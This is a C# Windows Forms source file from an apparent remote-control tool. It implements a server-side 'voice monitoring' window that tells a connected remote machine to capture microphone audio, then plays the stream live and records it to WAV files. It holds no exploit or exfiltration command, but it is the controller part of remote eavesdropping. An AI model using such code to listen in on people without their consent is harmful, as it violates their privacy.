using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;
using RemoteControl.Protocals.Response;
using RemoteControl.Audio;
using RemoteControl.Audio.Codecs;

namespace RemoteControl.Server
{
    public class FrmAudioMonitor : FrmBase
    {
        private SocketSession _session;
        private WaveOut _waveOut;
        private bool _isMonitoring;
        private DateTime _startTime;
        private Timer _timer;
        private FileStream _wavFile;
        private string _wavFilePath;
        private long _dataSize;

        private Label _statusLabel;
        private Label _timeLabel;
        private Button _startBtn;
        private Button _stopBtn;
        private ProgressBar _levelBar;
        private Label _filePathLabel;
        private Button _openFolderBtn;

        public FrmAudioMonitor(SocketSession session, string hostName)
        {
            _session = session;
            this.Text = "语音监听 — " + hostName;
            this.Size = new Size(450, 280);
            this.StartPosition = FormStartPosition.CenterScreen;
            this.FormBorderStyle = FormBorderStyle.FixedDialog;
            this.MaximizeBox = false;
            InitializeControls();
            StartMonitoring();
        }

        private void InitializeControls()
        {
            var statusTitle = new Label();
            statusTitle.Text = "状态：";
            statusTitle.Location = new Point(20, 20);
            statusTitle.AutoSize = true;
            statusTitle.Font = new Font("微软雅黑", 10F);

            _statusLabel = new Label();
            _statusLabel.Text = "未启动";
            _statusLabel.Location = new Point(80, 20);
            _statusLabel.AutoSize = true;
            _statusLabel.Font = new Font("微软雅黑", 10F, FontStyle.Bold);
            _statusLabel.ForeColor = Color.Gray;

            var timeTitle = new Label();
            timeTitle.Text = "时长：";
            timeTitle.Location = new Point(20, 55);
            timeTitle.AutoSize = true;
            timeTitle.Font = new Font("微软雅黑", 10F);

            _timeLabel = new Label();
            _timeLabel.Text = "00:00:00";
            _timeLabel.Location = new Point(80, 55);
            _timeLabel.AutoSize = true;
            _timeLabel.Font = new Font("微软雅黑", 10F);

            var levelTitle = new Label();
            levelTitle.Text = "音量：";
            levelTitle.Location = new Point(20, 90);
            levelTitle.AutoSize = true;
            levelTitle.Font = new Font("微软雅黑", 10F);

            _levelBar = new ProgressBar();
            _levelBar.Location = new Point(80, 90);
            _levelBar.Size = new Size(280, 22);
            _levelBar.Maximum = 100;
            _levelBar.Value = 0;

            _startBtn = new Button();
            _startBtn.Text = "开始监听";
            _startBtn.Location = new Point(80, 125);
            _startBtn.Size = new Size(120, 35);
            _startBtn.Font = new Font("微软雅黑", 9F);
            _startBtn.Click += StartBtn_Click;

            _stopBtn = new Button();
            _stopBtn.Text = "停止监听";
            _stopBtn.Location = new Point(220, 125);
            _stopBtn.Size = new Size(120, 35);
            _stopBtn.Font = new Font("微软雅黑", 9F);
            _stopBtn.Click += StopBtn_Click;

            _filePathLabel = new Label();
            _filePathLabel.Text = "";
            _filePathLabel.Location = new Point(20, 172);
            _filePathLabel.Size = new Size(300, 20);
            _filePathLabel.Font = new Font("微软雅黑", 8.5F);
            _filePathLabel.ForeColor = Color.DarkBlue;

            _openFolderBtn = new Button();
            _openFolderBtn.Text = "打开所在位置";
            _openFolderBtn.Location = new Point(320, 168);
            _openFolderBtn.Size = new Size(100, 26);
            _openFolderBtn.Font = new Font("微软雅黑", 8.5F);
            _openFolderBtn.Visible = false;
            _openFolderBtn.Click += OpenFolderBtn_Click;

            this.Controls.AddRange(new Control[]
            {
                statusTitle, _statusLabel, timeTitle, _timeLabel,
                levelTitle, _levelBar, _startBtn, _stopBtn,
                _filePathLabel, _openFolderBtn
            });

            _timer = new Timer();
            _timer.Interval = 1000;
            _timer.Tick += Timer_Tick;
        }

        private void StartBtn_Click(object sender, EventArgs e)
        {
            StartMonitoring();
        }

        private void StopBtn_Click(object sender, EventArgs e)
        {
            StopMonitoring();
        }

        private void StartMonitoring()
        {
            if (_isMonitoring) return;
            if (_session == null) return;

            // 初始化音频输出
            if (_waveOut == null && WaveOut.Devices.Length > 0)
            {
                _waveOut = new WaveOut(WaveOut.Devices[0], 8000, 16, 1);
            }

            // 创建录音文件
            CreateWavFile();

            _session.Send(ePacketType.PACKET_START_CAPTURE_AUDIO_REQUEST, new RequestStartCaptureAudio());
            _isMonitoring = true;
            _startTime = DateTime.Now;
            _timer.Start();

            _statusLabel.Text = "监听中...";
            _statusLabel.ForeColor = Color.Green;
            _startBtn.Enabled = false;
            _stopBtn.Enabled = true;
            _openFolderBtn.Visible = false;
            _filePathLabel.Text = "录音中...";
        }

        private void StopMonitoring()
        {
            if (!_isMonitoring) return;

            _session.Send(ePacketType.PACKET_STOP_CAPTURE_AUDIO_REQUEST, null);
            _isMonitoring = false;
            _timer.Stop();

            // 完成WAV文件写入
            FinalizeWavFile();

            _statusLabel.Text = "已停止";
            _statusLabel.ForeColor = Color.Red;
            _startBtn.Enabled = true;
            _stopBtn.Enabled = false;
            _levelBar.Value = 0;

            // 显示文件路径和打开按钮
            if (!string.IsNullOrEmpty(_wavFilePath) && File.Exists(_wavFilePath))
            {
                _filePathLabel.Text = Path.GetFileName(_wavFilePath);
                _openFolderBtn.Visible = true;
            }
        }

        public void HandleAudioData(byte[] audioData)
        {
            if (!_isMonitoring || audioData == null) return;

            // 解码并播放
            byte[] decoded = G711.Decode_aLaw(audioData, 0, audioData.Length);
            if (_waveOut != null)
            {
                _waveOut.Play(decoded, 0, decoded.Length);
            }

            // 写入WAV文件
            WriteWavData(decoded);

            // 计算音量等级显示
            int peak = 0;
            for (int i = 0; i < decoded.Length; i += 2)
            {
                if (i + 1 < decoded.Length)
                {
                    int sample = (short)(decoded[i] | (decoded[i + 1] << 8));
                    int abs = sample < 0 ? -sample : sample;
                    if (abs > peak) peak = abs;
                }
            }
            int level = (int)((peak / 32768.0) * 100);
            if (level > 100) level = 100;

            if (!this.IsDisposed && this.IsHandleCreated)
            {
                this.BeginInvoke((Action)(() =>
                {
                    if (!this.IsDisposed)
                        _levelBar.Value = level;
                }));
            }
        }

        private void Timer_Tick(object sender, EventArgs e)
        {
            if (_isMonitoring)
            {
                TimeSpan elapsed = DateTime.Now - _startTime;
                _timeLabel.Text = elapsed.ToString(@"hh\:mm\:ss");
            }
        }

        private void OpenFolderBtn_Click(object sender, EventArgs e)
        {
            if (!string.IsNullOrEmpty(_wavFilePath) && File.Exists(_wavFilePath))
            {
                Process.Start("explorer.exe", "/select," + _wavFilePath);
            }
        }

        private void CreateWavFile()
        {
            string dir = Path.Combine(Application.StartupPath, "recordings");
            if (!Directory.Exists(dir))
                Directory.CreateDirectory(dir);

            string fileName = "audio_" + DateTime.Now.ToString("yyyyMMdd_HHmmss") + ".wav";
            _wavFilePath = Path.Combine(dir, fileName);
            _dataSize = 0;

            _wavFile = new FileStream(_wavFilePath, FileMode.Create, FileAccess.Write);
            // 写入WAV头部占位(44字节), 停止时回填
            byte[] header = new byte[44];
            _wavFile.Write(header, 0, 44);
        }

        private void WriteWavData(byte[] pcmData)
        {
            if (_wavFile == null) return;
            try
            {
                _wavFile.Write(pcmData, 0, pcmData.Length);
                _dataSize += pcmData.Length;
            }
            catch { }
        }

        private void FinalizeWavFile()
        {
            if (_wavFile == null) return;
            try
            {
                // 回填WAV文件头
                int sampleRate = 8000;
                short bitsPerSample = 16;
                short channels = 1;
                int byteRate = sampleRate * channels * (bitsPerSample / 8);
                short blockAlign = (short)(channels * (bitsPerSample / 8));

                _wavFile.Seek(0, SeekOrigin.Begin);
                WriteWavHeader(_wavFile, (int)_dataSize, sampleRate, bitsPerSample, channels, byteRate, blockAlign);
                _wavFile.Flush();
                _wavFile.Close();
                _wavFile.Dispose();
            }
            catch { }
            _wavFile = null;
        }

        private void WriteWavHeader(FileStream fs, int dataSize, int sampleRate, short bitsPerSample, short channels, int byteRate, short blockAlign)
        {
            // RIFF header
            fs.Write(System.Text.Encoding.ASCII.GetBytes("RIFF"), 0, 4);
            fs.Write(BitConverter.GetBytes(36 + dataSize), 0, 4);
            fs.Write(System.Text.Encoding.ASCII.GetBytes("WAVE"), 0, 4);
            // fmt sub-chunk
            fs.Write(System.Text.Encoding.ASCII.GetBytes("fmt "), 0, 4);
            fs.Write(BitConverter.GetBytes(16), 0, 4); // SubChunk1Size (PCM=16)
            fs.Write(BitConverter.GetBytes((short)1), 0, 2); // AudioFormat (PCM=1)
            fs.Write(BitConverter.GetBytes(channels), 0, 2);
            fs.Write(BitConverter.GetBytes(sampleRate), 0, 4);
            fs.Write(BitConverter.GetBytes(byteRate), 0, 4);
            fs.Write(BitConverter.GetBytes(blockAlign), 0, 2);
            fs.Write(BitConverter.GetBytes(bitsPerSample), 0, 2);
            // data sub-chunk
            fs.Write(System.Text.Encoding.ASCII.GetBytes("data"), 0, 4);
            fs.Write(BitConverter.GetBytes(dataSize), 0, 4);
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            if (_isMonitoring)
            {
                StopMonitoring();
            }
            if (_waveOut != null)
            {
                _waveOut.Dispose();
                _waveOut = null;
            }
            _timer.Stop();
            _timer.Dispose();
            base.OnFormClosing(e);
        }
    }
}
